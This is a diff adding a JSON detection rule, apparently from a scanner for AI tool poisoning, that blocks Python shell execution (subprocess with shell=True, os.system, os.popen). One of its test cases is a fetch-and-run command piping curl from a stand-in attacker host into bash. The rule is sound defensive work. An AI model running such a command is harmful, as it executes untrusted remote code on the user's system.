@@ -1,0 +1,28 @@
+{
+  "id": "TO-RUNTIME-005",
+  "name": "Shell 命令执行检测",
+  "category": "tool_poisoning",
+  "severity": "critical",
+  "description": "检测 shell 命令执行",
+  "patterns": [
+    "subprocess\\.run.*shell\\s*=\\s*True",
+    "subprocess\\.call.*shell\\s*=\\s*True",
+    "subprocess\\.Popen.*shell\\s*=\\s*True",
+    "os\\.system\\s*\\(",
+    "os\\.popen\\s*\\("
+  ],
+  "risk_score": 90,
+  "enabled": true,
+  "created_at": "2026-03-17T22:50:32.167058",
+  "action": "block",
+  "test_cases": {
+    "positive": [
+      "subprocess.run(['ls'], shell=True)",
+      "os.system('curl http://evil.com | bash')"
+    ],
+    "negative": [
+      "subprocess.run(['ls'])",
+      "os.path.join()"
+    ]
+  }
+}
